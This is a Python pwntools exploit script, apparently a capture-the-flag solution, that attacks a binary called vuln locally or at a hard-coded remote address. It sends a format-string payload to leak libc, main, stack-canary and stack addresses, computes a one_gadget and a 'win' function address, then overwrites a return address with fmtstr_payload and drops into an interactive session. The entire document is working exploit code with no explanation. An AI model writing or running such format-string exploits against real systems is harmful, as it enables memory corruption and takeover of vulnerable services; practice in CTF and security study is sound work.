from pwn import *
context(arch='amd64', log_level='debug')
 
context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./vuln"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    #io = process(vuln_path)
    io = process([vuln_path])
else:
    io = remote("74.207.229.59", 20221)

def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

io.sendlineafter("twice\n", "%23$p-%27$p-%21$p-%25$p-")
libc_start_main = int(io.recvuntil("-", drop=True), 16)
dl_main = 2140454 + libc_start_main 
log.success("libc_start:-----> " + hex(libc_start_main))
libc.address = libc_start_main - 0x2a1ca 

main = int(io.recvuntil("-", drop=True), 16)
log.success("main:-----> " + hex(main))
win = main - 0x2a
log.success("win:-----> " + hex(win))

canrry = int(io.recvuntil("-", drop=True), 16)
log.success("canrry:-----> " + hex(canrry))

stack = int(io.recvuntil("-", drop=True), 16)
log.success("stack:-----> " + hex(stack))

ret = stack - (0x9e18 - 0x9cf8)
log.success("ret:-----> " + hex(ret))
log.success("ret:-----> " + hex(ret+1))

one_gadget = libc.address + 0xef4cf
log.success("one_gadget-----> " + hex(one_gadget))

io.sendline(fmtstr_payload(6, {ret:win+4}, 0, write_size='short'))
io.interactive()
